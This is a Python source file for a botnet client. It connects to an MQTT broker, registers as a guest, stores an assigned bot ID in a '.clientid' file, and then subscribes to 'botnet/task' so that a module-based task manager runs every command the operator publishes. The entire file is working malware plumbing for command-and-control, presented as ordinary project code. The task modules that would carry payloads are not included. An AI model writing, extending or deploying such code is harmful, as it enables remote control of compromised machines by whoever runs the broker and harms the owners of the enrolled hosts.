import paho.mqtt.client as mqtt
import time
import uuid
from threading import Thread

from botnet import logger
from botnet.module_manager import ModuleManager
from botnet.bot.task import TaskManager

class Bot():
    def __init__(self, client_id, address, port=1883):
        self.address = address
        self.port = port
        self.client_id = client_id

        self.client = mqtt.Client(self.client_id)
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message

    def connect(self):
        logger.debug("Connected to {}:{} ({})".format(self.address, self.port, self.client_id))
        self.client.connect(self.address, self.port, 60)

    def listen(self):
        self.client.loop_forever()

    def subscribe(self, topic):
        logger.debug("Subscribed to {}".format(topic))
        self.client.subscribe(topic)

    def publish(self, topic, message):
        logger.debug("Published to {}: {}".format(topic, message))
        self.client.publish(topic, message)

    def on_connect(self, client, userdata, flags, rc):
        pass

    def on_message(self, client, userdata, message):
        pass

class GuestBot(Bot):
    def __init__(self, address, port=1883):
        super().__init__("guest" + str(uuid.uuid1())[:8], address, port)

    def on_connect(self, client, userdata, flags, rc):
        if rc == 0:
            self.subscribe("botnet/client/register")
            self.publish("botnet/client/guest", "0")
    
    def on_message(self, client, userdata, message):
        if message.topic == "botnet/client/register":
            msg = message.payload.decode("UTF-8")
            
            msg = msg.split(":")
            if msg[0] == self.client_id:
                self.toRegisteredBot(msg[1])

        pass

    def getID(self):
        logger.debug("Récupération de l'ID du client")
        try:
            with open('.clientid') as f:
                content = f.read()

                if content == '':
                    raise FileNotFoundError("File .client.id not found")
                else:
                    logger.debug("ID : " + content)
                    return content
        except FileNotFoundError:
            return None


    def toRegisteredBot(self, client_id):
        bot = RegisteredBot(client_id, self.address, self.port)

        if self.client.is_connected():
            self.client.disconnect()

            with open(".clientid", "w") as f:
                f.write(client_id)

        bot.connect()
        bot.subscribe("botnet/task")
        bot.listen()

class RegisteredBot(Bot):
    def __init__(self, client_id, address, port=1883):
        self.module_manager = ModuleManager()
        self.module_manager.load()

        self.task_manager = TaskManager(self.module_manager)

        super().__init__(client_id, address, port)

    def on_message(self, client, userdata, message):
        logger.debug("Message received {}: {}".format(message.topic, message.payload.decode("UTF-8")))
        self.task_manager.queue(message.topic, message.payload.decode("UTF-8"))

